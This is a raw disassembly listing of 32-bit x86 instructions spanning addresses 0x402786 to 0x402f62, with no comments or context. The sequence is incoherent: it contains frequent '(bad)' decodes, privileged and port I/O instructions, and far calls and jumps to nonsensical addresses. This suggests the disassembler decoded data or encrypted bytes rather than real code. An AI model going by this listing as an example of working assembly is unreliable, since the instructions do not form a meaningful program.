  402786:	cmp    al,BYTE PTR [esi]
  402788:	call   0x4a1:0x9bb813e3
  40278f:	mov    bl,0x17
  402791:	shl    BYTE PTR [eax+0x18429c02],cl
  402797:	data16 les bp,DWORD PTR [esi-0x3f]
  40279c:	dec    edi
  40279d:	or     DWORD PTR [edi-0x2d0a6a8b],ebx
  4027a3:	pop    edx
  4027a4:	je     0x4027e7
  4027a6:	dec    eax
  4027a7:	int3   
  4027a8:	ja     0x4027c0
  4027aa:	dec    esp
  4027ab:	push   esi
  4027ac:	lock icebp 
  4027ae:	loop   0x402815
  4027b0:	(bad)  
  4027b1:	push   0xd287a6f8
  4027b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b7:	push   es
  4027b8:	hlt    
  4027b9:	push   edx
  4027ba:	jo     0x402805
  4027bc:	add    eax,0x596d24e8
  4027c1:	pop    ecx
  4027c2:	ss dec ebp
  4027c4:	stos   DWORD PTR es:[edi],eax
  4027c5:	pop    edx
  4027c6:	fs iret 
  4027c8:	dec    edi
  4027c9:	push   eax
  4027ca:	loope  0x4027d4
  4027cc:	popf   
  4027cd:	imul   edx,DWORD PTR [ebx-0x7ecfa5c5],0x663ed75a
  4027d7:	dec    ebx
  4027d8:	cwde   
  4027d9:	mov    edi,DWORD PTR [edx+0x4e]
  4027dc:	xchg   BYTE PTR [esi],ch
  4027de:	mov    DWORD PTR [ebp-0x66],esp
  4027e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e2:	sbb    DWORD PTR [edi+ecx*8+0x6],edx
  4027e6:	(bad)  [ebp+0x4b55a3e2]
  4027ec:	push   esp
  4027ed:	shl    BYTE PTR [eax+0x46495d9a],0x54
  4027f4:	push   cs
  4027f5:	mov    ds:0xcbc011fb,eax
  4027fa:	push   ds
  4027fb:	sbb    bl,BYTE PTR [ebp-0x4ff5c087]
  402801:	mov    al,0x38
  402803:	rep stos DWORD PTR es:[edi],eax
  402805:	or     bh,al
  402807:	sub    DWORD PTR [edx+esi*4+0x1ba0937d],esp
  40280e:	aaa    
  40280f:	push   edi
  402810:	xchg   edi,eax
  402811:	je     0x402797
  402813:	jnp    0x4027c3
  402815:	test   DWORD PTR [ebx-0x6c3dea5b],ecx
  40281b:	pcmpgtw mm6,QWORD PTR [edx]
  40281e:	jbe    0x402830
  402820:	pop    edx
  402821:	neg    BYTE PTR [ecx+edx*2+0x5dce6ad1]
  402828:	cmc    
  402829:	pop    ecx
  40282a:	sbb    eax,0x77afea19
  40282f:	jmp    0x899bfaf
  402834:	fld    TBYTE PTR [ecx]
  402836:	add    bl,BYTE PTR [ebx+0x1fe3436d]
  40283c:	test   DWORD PTR [ebx-0x7b93fcff],ebx
  402842:	inc    edi
  402843:	push   cs
  402844:	push   edi
  402845:	test   DWORD PTR [eax+ebx*1+0x397eec01],edx
  40284c:	bound  ebp,QWORD PTR ds:0xaa1f5a47
  402852:	sbb    ecx,ebx
  402854:	sub    DWORD PTR [ecx+edx*1-0x2b],0x71
  402859:	jns    0x4028a3
  40285b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40285c:	sub    ebp,DWORD PTR [ebp-0x60]
  40285f:	xor    al,0xdd
  402861:	cmp    al,ah
  402863:	inc    ebp
  402864:	loopne 0x4027ea
  402866:	jle    0x40282e
  402868:	fs out 0x81,eax
  40286b:	retf   
  40286c:	(bad)  
  40286d:	jle    0x40284f
  40286f:	mov    ebp,0xc7d87ab4
  402874:	xchg   ebp,eax
  402875:	es pop edi
  402877:	sub    DWORD PTR [ecx+0x55ed7d6c],ebp
  40287d:	test   DWORD PTR [edi+0x52f9485b],0x39502f42
  402887:	adc    dh,BYTE PTR ds:0xb73a8454
  40288d:	in     eax,dx
  40288e:	out    dx,eax
  40288f:	add    BYTE PTR ss:[eax],0x62
  402893:	xor    DWORD PTR [ecx],0x1b9f6899
  402899:	mov    ebx,0x500304ae
  40289e:	inc    ebx
  40289f:	out    0x69,al
  4028a1:	adc    BYTE PTR [ecx],bl
  4028a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a4:	shr    DWORD PTR ds:0x25f54395,cl
  4028aa:	xchg   edx,eax
  4028ab:	sbb    esi,DWORD PTR [esi-0x7f]
  4028ae:	stos   DWORD PTR es:[edi],eax
  4028af:	or     esp,DWORD PTR fs:[ecx+0x692ddc6d]
  4028b6:	xchg   edi,eax
  4028b7:	sahf   
  4028b8:	aad    0x1f
  4028ba:	pushf  
  4028bb:	sti    
  4028bc:	dec    eax
  4028bd:	pop    ss
  4028be:	cmc    
  4028bf:	inc    eax
  4028c0:	dec    esp
  4028c1:	bnd ja 0x40287d
  4028c4:	xchg   esi,eax
  4028c5:	mov    al,ds:0xf9464963
  4028ca:	aaa    
  4028cb:	xor    eax,0x471f7db9
  4028d0:	ins    BYTE PTR es:[edi],dx
  4028d1:	cmp    al,0xde
  4028d3:	jl     0x4028d2
  4028d5:	imul   edi,esi,0x60
  4028d8:	sar    DWORD PTR [ecx+0x7a],0x6c
  4028dc:	sub    al,0xf5
  4028de:	mov    ebp,0xc833e3ca
  4028e3:	ins    DWORD PTR es:[edi],dx
  4028e4:	or     cl,ah
  4028e6:	pop    ebp
  4028e7:	inc    eax
  4028e8:	fs pop edx
  4028ea:	daa    
  4028eb:	or     DWORD PTR [edx-0x5ec45299],eax
  4028f1:	mov    ebp,eax
  4028f3:	push   eax
  4028f4:	inc    ebx
  4028f5:	and    BYTE PTR [esi],dl
  4028f7:	icebp  
  4028f8:	std    
  4028f9:	pop    edx
  4028fa:	lods   eax,DWORD PTR ds:[esi]
  4028fb:	mov    BYTE PTR [ecx+0x7e],dh
  4028fe:	xchg   BYTE PTR [esi],dl
  402900:	dec    esi
  402901:	xor    BYTE PTR [edi],0x30
  402904:	push   0xffffffd6
  402906:	fistp  DWORD PTR [ebx+edx*4-0x61]
  40290a:	dec    ebx
  40290b:	ret    0xb5a0
  40290e:	repnz xchg esi,eax
  402910:	dec    ebx
  402911:	cld    
  402912:	in     eax,dx
  402913:	sbb    bh,BYTE PTR [eax]
  402915:	push   esp
  402916:	add    eax,0x16b2a02
  40291b:	sub    eax,0x90d1f73c
  402920:	push   0xffffffcb
  402922:	jb     0x4028f1
  402924:	mov    edx,0x36cbfc7f
  402929:	aad    0xba
  40292b:	cs inc esi
  40292d:	mov    esi,0x5a32a640
  402932:	les    eax,FWORD PTR [esi+esi*1+0x6072bb8e]
  402939:	out    dx,eax
  40293a:	daa    
  40293b:	mov    edi,0xcfd5736f
  402940:	ds iret 
  402942:	scas   eax,DWORD PTR es:[edi]
  402943:	fstp   QWORD PTR [edx+0x5e7fa35c]
  402949:	and    esi,DWORD PTR [esp+ebx*8]
  40294c:	sub    BYTE PTR [edi-0x69],dh
  40294f:	aad    0x51
  402951:	pushf  
  402952:	and    ch,BYTE PTR ds:0xe302bcfe
  402958:	cmp    edx,DWORD PTR [eax+0x32]
  40295b:	inc    eax
  40295c:	in     al,dx
  40295d:	push   edi
  40295e:	inc    esp
  40295f:	xor    ebx,esp
  402961:	out    dx,al
  402962:	xchg   esi,eax
  402963:	jp     0x4028fc
  402965:	or     eax,0x3cdb1de9
  40296a:	fucompp 
  40296c:	or     al,0xc5
  40296e:	gs adc cl,bh
  402971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402972:	fisubr WORD PTR [ebp-0x641acab2]
  402978:	lahf   
  402979:	push   ebx
  40297a:	retf   
  40297b:	xchg   ecx,eax
  40297c:	(bad)  
  40297d:	pop    edx
  40297e:	das    
  40297f:	das    
  402980:	fwait
  402981:	shl    DWORD PTR [eax-0x7f9026af],cl
  402987:	addr16 in eax,0xbe
  40298a:	cmp    DWORD PTR [ebx],edx
  40298c:	loop   0x4029f3
  40298e:	xchg   ecx,eax
  40298f:	sub    ah,BYTE PTR [ebp+0x45]
  402992:	fst    QWORD PTR [ecx+0x4cfd1d72]
  402998:	sbb    dl,BYTE PTR ss:0xaafd5a5a
  40299f:	bound  ecx,QWORD PTR [ebx+0x27]
  4029a2:	xchg   edi,eax
  4029a3:	int3   
  4029a4:	popa   
  4029a5:	sar    BYTE PTR [ebx+0x61],0x9d
  4029a9:	xor    ah,BYTE PTR [ebx-0x1a]
  4029ac:	rol    BYTE PTR [ecx+0xaeb6dc9],0x8c
  4029b3:	sub    DWORD PTR [ebx+0x6be3a340],ebx
  4029b9:	pop    es
  4029ba:	push   cs
  4029bb:	adc    al,0x53
  4029bd:	arpl   bp,sp
  4029bf:	mov    dh,0x8a
  4029c1:	inc    edi
  4029c2:	fidiv  WORD PTR [edi+0x7065027e]
  4029c8:	sti    
  4029c9:	push   ss
  4029ca:	cmp    eax,0xeb02ac81
  4029cf:	jmp    0x4029ef
  4029d1:	pop    ds
  4029d2:	lock je 0x40297c
  4029d5:	inc    edx
  4029d6:	cmp    DWORD PTR [eax],esi
  4029d8:	fbld   TBYTE PTR [ebx+0x42]
  4029db:	fild   QWORD PTR ds:0xdfce4732
  4029e1:	dec    ebx
  4029e2:	sahf   
  4029e3:	cmc    
  4029e4:	inc    edx
  4029e5:	aas    
  4029e6:	(bad)  
  4029e7:	gs in  al,dx
  4029e9:	cmp    esp,esp
  4029eb:	int    0xf3
  4029ed:	loope  0x402a12
  4029ef:	mov    dh,0x8d
  4029f1:	sub    dh,ch
  4029f3:	adc    ah,BYTE PTR [edi]
  4029f5:	sbb    al,0x67
  4029f7:	aam    0x8b
  4029f9:	sti    
  4029fa:	dec    edx
  4029fb:	inc    eax
  4029fc:	adc    edi,DWORD PTR [ebx+0x45]
  4029ff:	push   es
  402a00:	les    edi,FWORD PTR [ebp+eiz*2-0x4b840874]
  402a07:	inc    ebp
  402a08:	in     eax,dx
  402a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0a:	stc    
  402a0b:	jle    0x4029f0
  402a0d:	pop    es
  402a0e:	xchg   ebx,eax
  402a0f:	mov    ebx,ds
  402a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a12:	data16 gs sub al,0x7f
  402a16:	dec    ecx
  402a17:	cmc    
  402a18:	pop    ecx
  402a19:	ret    0x1696
  402a1c:	xor    DWORD PTR ds:0x51aead16,edi
  402a22:	pop    esp
  402a23:	aas    
  402a24:	sti    
  402a25:	sahf   
  402a26:	mov    esi,0x42b76194
  402a2b:	loope  0x4029e6
  402a2d:	stos   DWORD PTR es:[edi],eax
  402a2e:	or     ecx,DWORD PTR [edx]
  402a30:	mov    dh,BYTE PTR [edx-0x4fd3d34e]
  402a36:	sub    ah,BYTE PTR [esi]
  402a38:	and    eax,0x87d2c8b7
  402a3d:	jg     0x402a3e
  402a3f:	or     DWORD PTR [esi],edi
  402a41:	pop    ebx
  402a42:	add    BYTE PTR [edx-0x7930a013],dh
  402a48:	imul   ebp,DWORD PTR ds:[edi],0x6e
  402a4c:	rol    DWORD PTR [ebp+0x76],1
  402a4f:	shl    esi,0x85
  402a52:	xor    al,0x8f
  402a54:	or     al,0x80
  402a56:	sub    ah,BYTE PTR [esi+esi*1-0x6cab27fd]
  402a5d:	fistp  WORD PTR [ebx-0x42b18388]
  402a63:	popa   
  402a64:	(bad)  
  402a65:	test   al,0x3a
  402a67:	ret    
  402a68:	xchg   esi,eax
  402a69:	xor    DWORD PTR [ebp-0xc2d5171],ebx
  402a6f:	or     BYTE PTR [esi],bl
  402a71:	xchg   edx,eax
  402a72:	fucomi st,st(1)
  402a74:	inc    edx
  402a75:	outs   dx,BYTE PTR ds:[esi]
  402a76:	popf   
  402a77:	test   al,0xca
  402a79:	adc    ecx,DWORD PTR [ecx+0x5f]
  402a7c:	sti    
  402a7d:	adc    BYTE PTR [edx],ah
  402a7f:	push   ecx
  402a80:	push   ds
  402a81:	mov    BYTE PTR ds:0x9a350c0a,0xf8
  402a88:	fwait
  402a89:	lahf   
  402a8a:	jns    0x402aea
  402a8c:	xor    BYTE PTR [edx-0x67a78482],bh
  402a92:	js     0x402ad7
  402a94:	fwait
  402a95:	loope  0x402acb
  402a97:	pop    ecx
  402a98:	mov    WORD PTR [esp+edi*1+0x77729081],cs
  402a9f:	mov    ah,0xb9
  402aa1:	mov    esp,DWORD PTR [edi-0x7d]
  402aa4:	mov    cl,0xf6
  402aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aa7:	mov    ds:0x852f7688,al
  402aac:	dec    eax
  402aad:	mov    ?,WORD PTR [edi-0x30]
  402ab0:	or     BYTE PTR [esi],ah
  402ab2:	(bad)
  402ab5:	sbb    eax,0x9c97ab92
  402aba:	iret   
  402abb:	xor    DWORD PTR [ebx],ebp
  402abd:	mov    eax,0xc80bf555
  402ac2:	je     0x402aeb
  402ac4:	dec    edi
  402ac5:	inc    ebp
  402ac6:	xlat   BYTE PTR ds:[ebx]
  402ac7:	test   al,0x4d
  402ac9:	mov    edx,0x46dc1a57
  402ace:	cmp    BYTE PTR ds:0x76657e31,0xa4
  402ad5:	sub    BYTE PTR [edx+ebx*1+0x7e],bl
  402ad9:	lock enter 0xcc58,0xf5
  402ade:	jo     0x402a64
  402ae0:	stos   DWORD PTR es:[edi],eax
  402ae1:	xor    eax,0xca296e50
  402ae6:	mov    ecx,ds
  402ae8:	stos   DWORD PTR es:[edi],eax
  402ae9:	retf   0x8d78
  402aec:	aaa    
  402aed:	cmp    cl,BYTE PTR [eax+0x7]
  402af0:	or     eax,0xcf7fa839
  402af5:	adc    ebp,0x41f551eb
  402afb:	sub    BYTE PTR [edx-0x74],ch
  402afe:	inc    ecx
  402aff:	imul   esi,esi,0xff9a447c
  402b05:	push   0xa0e68a80
  402b0a:	push   esi
  402b0b:	hlt    
  402b0c:	push   cs
  402b0d:	mov    eax,0x2987737d
  402b12:	add    al,BYTE PTR [edi+0xc]
  402b15:	xor    edx,DWORD PTR [ecx-0x3fa07aef]
  402b1b:	lds    ebx,FWORD PTR [eax+0x7ccdb011]
  402b21:	test   DWORD PTR [edi+0x2a59c1e5],0x290aff10
  402b2b:	les    ecx,FWORD PTR [ebp-0x568e10a4]
  402b31:	(bad)  [ecx*4-0x1988a50b]
  402b38:	fwait
  402b39:	pop    ss
  402b3a:	cwde   
  402b3b:	lds    ebp,FWORD PTR [edx+0x5eca11cb]
  402b41:	or     DWORD PTR [ebx+0x763586c6],esp
  402b47:	in     al,0xf
  402b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b4a:	mov    bh,0x9b
  402b4c:	push   0xffffffb8
  402b4e:	add    bh,ch
  402b50:	fwait
  402b51:	loop   0x402b97
  402b53:	push   ecx
  402b54:	mov    bl,0x56
  402b56:	push   edi
  402b57:	idiv   BYTE PTR [edi+esi*4+0x4c]
  402b5b:	mov    esi,0xc1349788
  402b60:	pop    ds
  402b61:	(bad)  
  402b62:	push   esi
  402b63:	cmp    dl,0x10
  402b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b67:	mov    ebp,0x984d1b67
  402b6c:	dec    edi
  402b6d:	cmp    al,0xe2
  402b6f:	or     DWORD PTR [edi],ecx
  402b71:	push   edi
  402b72:	push   es
  402b73:	mov    eax,ds:0x1363a1eb
  402b78:	jo     0x402b43
  402b7a:	mov    eax,ds:0x606fdd51
  402b7f:	popa   
  402b80:	push   eax
  402b81:	psadbw mm0,mm1
  402b84:	jmp    0x57b13642
  402b89:	js     0x402bce
  402b8b:	jns    0x402b71
  402b8d:	push   ds
  402b8e:	cmp    ecx,esi
  402b90:	jo     0x402bbe
  402b92:	sti    
  402b93:	cmp    DWORD PTR [edx],0xf356b147
  402b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b9a:	jle    0x402b68
  402b9c:	loopne 0x402c0c
  402b9e:	mov    ds:0x785614d9,eax
  402ba3:	jae    0x402b77
  402ba5:	rol    DWORD PTR [ecx+0x309b96dc],0x73
  402bac:	dec    edx
  402bad:	jecxz  0x402b68
  402baf:	test   DWORD PTR [edi-0x18],esi
  402bb2:	mov    esp,0x9e0525e7
  402bb7:	sub    cl,BYTE PTR [eax-0xd]
  402bba:	inc    esi
  402bbb:	ins    BYTE PTR es:[edi],dx
  402bbc:	xchg   ebx,eax
  402bbd:	gs lahf 
  402bbf:	leave  
  402bc0:	mov    edi,0x1f460b40
  402bc5:	xor    bl,BYTE PTR ds:0x531d3191
  402bcb:	pop    edx
  402bcc:	pop    ss
  402bcd:	aad    0x8b
  402bcf:	mov    eax,DWORD PTR [esi+0x7920f76c]
  402bd5:	or     eax,0x3ba49382
  402bda:	ss jmp 0x3147ebfb
  402be0:	repz sub cl,bh
  402be3:	cmp    DWORD PTR [ebp-0x7d],0x6b35860c
  402bea:	cmp    eax,0x45c812b2
  402bef:	xchg   esi,eax
  402bf0:	pop    eax
  402bf1:	jl     0x402b77
  402bf3:	in     eax,0xb6
  402bf5:	jne    0x402c57
  402bf7:	lds    ecx,FWORD PTR [ecx-0x41]
  402bfa:	popf   
  402bfb:	or     DWORD PTR [ebx-0x3fcbd9dd],0xffffff8f
  402c02:	cmp    eax,0xc2e28772
  402c07:	xor    al,cl
  402c09:	jne    0x402be0
  402c0b:	bound  ecx,QWORD PTR [edx]
  402c0d:	mov    bl,0xf2
  402c0f:	ins    DWORD PTR es:[edi],dx
  402c10:	daa    
  402c11:	cmp    eax,0x9eca6163
  402c16:	ficomp WORD PTR fs:[edi+0x5c8c051b]
  402c1d:	(bad)  
  402c1f:	in     eax,0x6
  402c21:	mov    esi,0x6c549f12
  402c26:	call   0xf8f5:0x2cd5e9b5
  402c2d:	xor    BYTE PTR [esi-0x67],ch
  402c30:	cdq    
  402c31:	stos   BYTE PTR es:[edi],al
  402c32:	inc    ebp
  402c33:	aas    
  402c34:	xchg   edx,eax
  402c35:	ss ins DWORD PTR es:[edi],dx
  402c37:	adc    DWORD PTR [edi+0xe916d97],0x2f
  402c3e:	xchg   ebp,eax
  402c3f:	daa    
  402c40:	jecxz  0x402c9d
  402c42:	fwait
  402c43:	int    0xb6
  402c45:	pop    ss
  402c46:	adc    DWORD PTR [eax+0x4a],esi
  402c49:	add    BYTE PTR ds:0x999ebe9c,bl
  402c4f:	fisub  DWORD PTR [edi]
  402c51:	sbb    eax,0x5beff2c5
  402c56:	and    cl,BYTE PTR [ecx-0x5f]
  402c59:	in     eax,0xc8
  402c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c5c:	push   ebx
  402c5d:	mov    ah,BYTE PTR [ecx-0x1f]
  402c60:	push   ecx
  402c61:	xchg   ebp,eax
  402c62:	ins    BYTE PTR es:[edi],dx
  402c63:	mov    ebx,0xe168af43
  402c68:	leave  
  402c69:	test   dl,0xb4
  402c6c:	stc    
  402c6d:	add    al,0xfc
  402c6f:	mov    eax,ds:0x28ae4b72
  402c74:	outs   dx,DWORD PTR ds:[esi]
  402c75:	neg    BYTE PTR [edx+0x4]
  402c78:	xor    DWORD PTR [ebx-0x79],eax
  402c7b:	lds    ecx,FWORD PTR [esi+eiz*2+0x1937667d]
  402c82:	xor    dh,BYTE PTR [edi+0x16]
  402c85:	mov    al,0xe8
  402c87:	sbb    ecx,DWORD PTR [ecx]
  402c89:	mov    esp,0x4c8842b9
  402c8e:	push   ss
  402c8f:	mov    esi,0x4df9323e
  402c94:	adc    al,0x44
  402c96:	sahf   
  402c97:	or     edi,DWORD PTR [esi-0x4497febe]
  402c9d:	or     al,0x35
  402c9f:	fild   WORD PTR [edi+0x2]
  402ca2:	sbb    al,0x62
  402ca4:	repz sbb edi,ebx
  402ca7:	call   0x1b12d129
  402cac:	inc    eax
  402cad:	sbb    DWORD PTR [ebp+0x58],ebp
  402cb0:	push   ss
  402cb1:	push   es
  402cb2:	shr    DWORD PTR [edx-0x53],1
  402cb5:	push   eax
  402cb6:	iret   
  402cb7:	es scas eax,DWORD PTR es:[edi]
  402cb9:	adc    esi,ebp
  402cbb:	push   0xffffff8f
  402cbd:	aam    0x75
  402cbf:	outs   dx,BYTE PTR ds:[esi]
  402cc0:	les    esi,FWORD PTR [ebp-0x55]
  402cc3:	retf   0xfbf0
  402cc6:	into   
  402cc7:	sbb    eax,0x54f7938a
  402ccc:	inc    edi
  402ccd:	mov    ebp,0xf7f69a92
  402cd2:	int    0xb
  402cd4:	sub    ebp,DWORD PTR [eax-0x5f7177f]
  402cda:	or     BYTE PTR ds:0xb139edba,bh
  402ce0:	push   ebp
  402ce1:	call   0xd5f4:0x266de543
  402ce8:	into   
  402ce9:	mov    ebx,0x1e5b9f55
  402cee:	push   edx
  402cef:	sub    al,al
  402cf1:	fs pop dx
  402cf4:	mov    eax,ds:0x1a8289fd
  402cf9:	xor    dl,BYTE PTR [edi]
  402cfb:	fist   DWORD PTR [ecx]
  402cfd:	cld    
  402cfe:	xor    al,0xc7
  402d00:	std    
  402d01:	prefetcht2 BYTE PTR [esi-0x3b34b403]
  402d08:	aaa    
  402d09:	in     al,0xa3
  402d0b:	leave  
  402d0c:	jmp    0x402c91
  402d0e:	adc    eax,0xa747002b
  402d13:	mov    bh,0x6a
  402d15:	les    eax,FWORD PTR [edx]
  402d17:	mov    WORD PTR [edi+0x49],fs
  402d1a:	pop    eax
  402d1b:	dec    edx
  402d1c:	add    DWORD PTR [ebx],0x98c4c879
  402d22:	faddp  st(1),st
  402d24:	pop    ds
  402d25:	add    DWORD PTR [esi+0x1b],esi
  402d28:	rcr    DWORD PTR [eax],cl
  402d2a:	jb     0x402d00
  402d2c:	mov    edx,edx
  402d2e:	push   ds
  402d2f:	gs inc esi
  402d31:	adc    edx,DWORD PTR [edx+0x283183c7]
  402d37:	or     BYTE PTR [ebp-0x4e794472],bl
  402d3d:	sub    BYTE PTR [ebx-0x4fb808a],cl
  402d43:	push   ds
  402d44:	ror    DWORD PTR [ecx+0x32c29a9a],1
  402d4a:	push   ss
  402d4b:	clc    
  402d4c:	out    dx,eax
  402d4d:	ds dec ebx
  402d4f:	(bad)  
  402d50:	cmp    bh,BYTE PTR [ecx]
  402d52:	rcl    DWORD PTR [ebp+0x39],1
  402d55:	dec    esp
  402d56:	mov    ah,BYTE PTR [esi+0xe]
  402d59:	je     0x402d82
  402d5b:	sahf   
  402d5c:	or     dl,bl
  402d5e:	xor    eax,0x78a67f8c
  402d63:	je     0x402d8f
  402d65:	add    esp,DWORD PTR [edx+0x1337e5a3]
  402d6b:	push   0xdcb39f78
  402d70:	rol    DWORD PTR [ebp+0x6d06e30a],cl
  402d76:	jmp    0x58003ed3
  402d7b:	push   es
  402d7c:	enter  0x4446,0xed
  402d80:	jmp    0x402d93
  402d82:	ret    
  402d83:	sbb    BYTE PTR [ebp+0x1dd76f01],ch
  402d89:	mov    cs,WORD PTR [esi+edi*4]
  402d8c:	push   ebx
  402d8d:	add    DWORD PTR [edx+0x8],0x70
  402d91:	mov    esp,ebp
  402d93:	dec    edi
  402d94:	out    0xfa,al
  402d96:	jp     0x402d71
  402d98:	xchg   edx,eax
  402d99:	xchg   edi,eax
  402d9a:	cli    
  402d9b:	lock stc 
  402d9d:	test   eax,0x32cdfdd8
  402da2:	mov    bl,0xce
  402da4:	jg     0x402d8d
  402da6:	sub    eax,0x7b060a3b
  402dab:	adc    al,0x9a
  402dad:	dec    eax
  402dae:	psllq  mm6,mm2
  402db1:	mov    ecx,0x31c71020
  402db6:	lea    ebp,[edi+0x4c]
  402db9:	aad    0x1b
  402dbb:	jmp    0x402dde
  402dbd:	dec    esp
  402dbe:	ja     0x402dc5
  402dc0:	add    BYTE PTR [edx],ch
  402dc2:	mov    bl,0xb1
  402dc4:	mov    dl,0xdc
  402dc6:	fdivr  QWORD PTR [edi+0x41]
  402dc9:	(bad)  ds:0x2db31135
  402dcf:	push   0xffffff9d
  402dd1:	retf   
  402dd2:	xchg   ebx,eax
  402dd3:	stos   DWORD PTR es:[edi],eax
  402dd4:	xchg   esi,eax
  402dd5:	lea    ebx,ss:[ebx]
  402dd8:	(bad)  
  402dd9:	pop    eax
  402dda:	aas    
  402ddb:	aaa    
  402ddc:	mov    eax,ds:0x32d895ef
  402de1:	and    BYTE PTR [ebx+0x212dec07],0x82
  402de8:	sbb    eax,0xe936a112
  402ded:	sbb    esp,esi
  402def:	xor    ecx,ebp
  402df1:	dec    ebp
  402df2:	xchg   esp,eax
  402df3:	add    al,0xd8
  402df5:	fsubr  QWORD PTR [edx+0x4c803c4c]
  402dfb:	jnp    0x402de9
  402dfd:	aam    0xe9
  402dff:	(bad)  
  402e00:	stos   DWORD PTR es:[edi],eax
  402e01:	add    al,0xc7
  402e03:	xor    edi,DWORD PTR [edx-0x32]
  402e06:	mov    edi,0x3073a0
  402e0b:	psubsb mm6,mm6
  402e0e:	jno    0x402e61
  402e10:	or     ecx,DWORD PTR [edi-0x50]
  402e13:	(bad)  
  402e14:	and    al,0xdf
  402e16:	xor    DWORD PTR [ecx-0x37],ebx
  402e19:	ss add al,0x6b
  402e1c:	cmp    eax,0x9a380568
  402e21:	inc    edx
  402e22:	jns    0x402e7d
  402e24:	loop   0x402e4b
  402e26:	adc    edi,DWORD PTR [edi-0x52]
  402e29:	imul   esp,DWORD PTR ds:0x72c941f4,0x3146a903
  402e33:	mov    ds:0xfecb58dc,eax
  402e38:	inc    edi
  402e39:	in     al,dx
  402e3a:	mov    BYTE PTR [ecx],dh
  402e3c:	dec    edi
  402e3d:	out    dx,al
  402e3e:	add    DWORD PTR ds:0xbd134a7,esi
  402e44:	not    dh
  402e46:	push   0x2e
  402e48:	int3   
  402e49:	pop    ecx
  402e4a:	mov    eax,DWORD PTR [eax+ebx*1-0x3d]
  402e4e:	mov    esp,0xa0d9fd47
  402e53:	mov    al,0x27
  402e55:	div    BYTE PTR [esi+0x41012a5e]
  402e5b:	jnp    0x402e56
  402e5d:	dec    ebx
  402e5e:	(bad)  
  402e5f:	enter  0x1f24,0xa5
  402e63:	jmp    0xf0ad9f69
  402e68:	xchg   edi,eax
  402e69:	pop    es
  402e6a:	jbe    0x402eb2
  402e6c:	dec    ebp
  402e6d:	cmp    ah,BYTE PTR [ebx]
  402e6f:	inc    edi
  402e70:	jnp    0x402e74
  402e72:	jne    0x402e06
  402e74:	ror    bh,0x18
  402e77:	add    al,0x11
  402e79:	and    ah,dl
  402e7b:	sahf   
  402e7c:	inc    edi
  402e7d:	dec    edi
  402e7e:	adc    esi,DWORD PTR [esi-0x657dca6b]
  402e84:	sbb    esp,ebx
  402e86:	adc    ebx,DWORD PTR [esi+0x65]
  402e89:	sub    eax,0x3fa77799
  402e8e:	pop    ebx
  402e8f:	cld    
  402e90:	pusha  
  402e91:	ds repz push 0x60
  402e95:	xor    ecx,ecx
  402e97:	outs   dx,DWORD PTR ds:[esi]
  402e98:	das    
  402e99:	stos   BYTE PTR es:[edi],al
  402e9a:	not    esp
  402e9c:	std    
  402e9d:	retf   
  402e9e:	push   cs
  402e9f:	outs   dx,BYTE PTR ds:[esi]
  402ea0:	adc    BYTE PTR [eax-0x6b],0x32
  402ea4:	stc    
  402ea5:	loopne 0x402e69
  402ea7:	dec    esi
  402ea8:	mov    esi,0xf89c0eb7
  402ead:	and    al,0x93
  402eaf:	or     cl,BYTE PTR [esi+0x484b6b2f]
  402eb5:	jmp    0x402f0e
  402eb7:	push   eax
  402eb8:	cmp    eax,0x2aa97052
  402ebd:	stc    
  402ebe:	test   DWORD PTR [esi+0x23],esi
  402ec1:	fst    DWORD PTR [ebx-0x7c886e53]
  402ec7:	outs   dx,BYTE PTR ds:[esi]
  402ec8:	test   ah,cl
  402eca:	mov    esp,0x404d43fb
  402ecf:	dec    edi
  402ed0:	dec    esi
  402ed1:	into   
  402ed2:	les    ebp,FWORD PTR [edi+0x400ad00f]
  402ed8:	jno    0x402f12
  402eda:	cld    
  402edb:	or     ebp,esp
  402edd:	mov    edi,DWORD PTR [edi-0x1e84f454]
  402ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee4:	cmp    eax,0x1d277f30
  402ee9:	cld    
  402eea:	into   
  402eeb:	lods   eax,DWORD PTR ds:[esi]
  402eec:	mov    WORD PTR [esi+0x2],ss
  402eef:	pushf  
  402ef0:	xor    cl,BYTE PTR ds:0x5247e6de
  402ef6:	jnp    0x402edc
  402ef8:	dec    ebp
  402ef9:	aad    0x65
  402efb:	mov    dl,0x24
  402efd:	rcl    ah,0xcf
  402f00:	(bad)
  402f04:	inc    di
  402f06:	xor    BYTE PTR [edi],cl
  402f08:	sub    DWORD PTR [ecx],edi
  402f0a:	repnz mov BYTE PTR [esi],bl
  402f0d:	arpl   WORD PTR [esi+0x3770ad2c],dx
  402f13:	popf   
  402f14:	fcmovb st,st(3)
  402f16:	adc    eax,0xd9f53c95
  402f1b:	mov    dl,0xee
  402f1d:	cmp    al,0xef
  402f1f:	push   ecx
  402f20:	icebp  
  402f21:	xchg   esi,eax
  402f22:	sub    DWORD PTR [ecx+ebp*1+0x56],ebp
  402f26:	adc    al,0x77
  402f28:	pop    ecx
  402f29:	add    eax,0x9513ac56
  402f2e:	mov    eax,ds:0xb94894f2
  402f33:	ror    BYTE PTR [edi-0x69],1
  402f36:	int    0xa5
  402f38:	sbb    esp,DWORD PTR [edx]
  402f3a:	dec    esi
  402f3b:	dec    esp
  402f3c:	jbe    0x402f92
  402f3e:	jmp    0x17739c1e
  402f43:	int3   
  402f44:	dec    esi
  402f45:	jbe    0x402f04
  402f47:	push   0x7dd4d894
  402f4c:	pop    ss
  402f4d:	mov    edi,0xb88723ce
  402f52:	inc    ebp
  402f53:	cmp    DWORD PTR [esi-0xd13df0a],esi
  402f59:	pop    ss
  402f5a:	xchg   ebx,eax
  402f5b:	push   esi
  402f5c:	fst    DWORD PTR [edi+0x57fd9662]
  402f62:	(bad)  
